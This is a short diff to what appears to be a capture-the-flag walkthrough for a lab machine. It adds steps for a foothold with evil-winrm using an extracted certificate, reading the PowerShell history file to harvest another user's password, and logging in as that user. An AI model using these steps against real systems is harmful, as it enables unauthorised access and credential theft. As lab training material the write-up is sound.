@@ -68,6 +68,12 @@ Run the following command to extract the certificate:
 
     openssl pkcs12 -in [yourfile.pfx] -clcerts -nokeys -out [legacyy.crt]
 
-Use the following command to get the foothold
+Use the following command to get the foothold and get user.txt
 
     └─$ evil-winrm -i 10.10.11.152 -S -c legacyy.crt -k private.key
+    
+Next we can use the following command `get-psreadlineoption` to get the path to powershell history file
+
+Read the history file and you should be able to get the password for another user
+
+Access the user powershell with this command `└─$ evil-winrm -i 10.10.11.152 -u $USER -p $PASSWORD -S`
